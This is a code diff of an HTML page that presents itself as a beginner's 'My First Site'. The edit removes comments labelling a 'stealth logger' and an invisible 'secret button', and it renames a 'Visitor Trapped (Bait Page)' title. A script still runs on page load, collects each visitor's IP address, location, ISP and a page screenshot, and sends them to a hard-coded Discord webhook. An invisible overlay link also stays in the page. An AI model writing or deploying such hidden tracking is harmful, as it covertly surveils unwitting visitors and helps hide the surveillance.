@@ -4,33 +4,20 @@
   <meta charset="UTF-8">
   <title>My First Site</title>
   <style>
-    body {
-      font-family: 'Comic Sans MS', cursive;
-      background: linear-gradient(to bottom, #ff9a9e, #fad0c4);
-      margin: 0; padding: 0; color: #333; text-align: center;
-    }
-    .container {
-      max-width: 700px; margin: 3rem auto; padding: 2rem;
-      background: rgba(255,255,255,0.9); border-radius: 20px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
-    }
-    h1 { color: #e91e63; margin-bottom: 0.2rem; position: relative; }
-    .secret-btn {
-      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-      opacity: 0; cursor: pointer; z-index: 10;
-    }
-    .emoji { font-size: 3rem; margin: 1rem 0; }
-    .blink { animation: blink 1s step-end infinite; }
-    @keyframes blink { 50% { opacity: 0; } }
+    body {font-family: 'Comic Sans MS', cursive; background: linear-gradient(to bottom, #ff9a9e, #fad0c4); margin:0; padding:0; color:#333; text-align:center;}
+    .container {max-width:700px; margin:3rem auto; padding:2rem; background:rgba(255,255,255,0.9); border-radius:20px; box-shadow:0 8px 20px rgba(0,0,0,0.1);}
+    h1 {color:#e91e63; margin-bottom:0.2rem; position:relative;}
+    .secret-btn {position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; cursor:pointer; z-index:10;}
+    .emoji {font-size:3rem; margin:1rem 0;}
+    .blink {animation: blink 1s step-end infinite;}
+    @keyframes blink {50% {opacity:0;}}
   </style>
 </head>
 <body>
-
 <div class="container">
   <h1 style="position:relative;">
     My First Site
-    <!-- SECRET BUTTON (INVISIBLE) -->
-    <a href="trape.index" class="secret-btn" title="shh..."></a>
+    <a href="trape.index" class="secret-btn"></a>
   </h1>
   <p class="emoji">Hello World</p>
   <p>Welcome tto my first website! I'm just learning HTML and CSS. Hope you like it!</p>
@@ -38,47 +25,37 @@
   <p>Made with love and zero budget</p>
 </div>
 
-<!-- STEALTH LOGGER (FROM BEFORE) -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1381021459350032484/Z-HEIw2n1czbqpnWl-UicGzWgfrHth3W0naPyAkIoI3Sf3bx4bsINYQJDnvIHf1ky0tL';
 
-  async function getIP() {
-    const res = await fetch('https://ipapi.co/json/');
-    return await res.json();
-  }
-
-  async function screenshot() {
-    try {
-      const canvas = await html2canvas(document.body, {scale: 0.5});
-      return canvas.toDataURL('image/png');
-    } catch { return null; }
-  }
-
   (async () => {
     try {
-      const data = await getIP();
-      const ss = await screenshot();
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+      const canvas = await html2canvas(document.body, {scale: 0.5});
+      const ss = canvas.toDataURL('image/png');
+
       const embed = {
-        title: 'Visitor Trapped (Bait Page)',
+        title: 'Visitor on Lxu00/MySite',
         color: 0x00ff00,
         fields: [
           {name: 'IP', value: data.ip, inline: true},
           {name: 'Location', value: `${data.city}, ${data.country_name}`, inline: true},
-          {name: 'ISP', value: data.org, inline: true}
+          {name: 'ISP', value: data.org || 'N/A', inline: true}
         ],
         timestamp: new Date().toISOString()
       };
-      if (ss) {
-        await fetch(WEBHOOK, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({embeds: [embed], files: [{attachment: ss, name: 'proof.png'}]})
-        });
-      } else {
-        await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({embeds: [embed]})});
-      }
-    } catch {}
+
+      await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          embeds: [embed],
+          files: [{attachment: ss, name: 'screenshot.png'}]
+        })
+      });
+    } catch(e) {}
   })();
 </script>
 </body>
